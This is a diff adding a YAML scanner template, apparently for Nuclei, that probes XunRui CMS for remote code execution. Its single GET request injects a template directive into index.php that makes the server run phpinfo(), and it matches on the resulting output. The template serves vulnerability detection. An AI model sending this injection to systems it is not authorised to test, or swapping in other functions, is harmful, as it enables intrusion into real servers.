@@ -1,0 +1,21 @@
+id: poc-yaml-xunrui-cms-index-rce
+info:
+  name: XunRui CMS index Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=phpinfo%20param0=-1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "xunruicms"
+          - "PHP API"
+          - "phpinfo()"
+          - '"code":1,"msg":"'
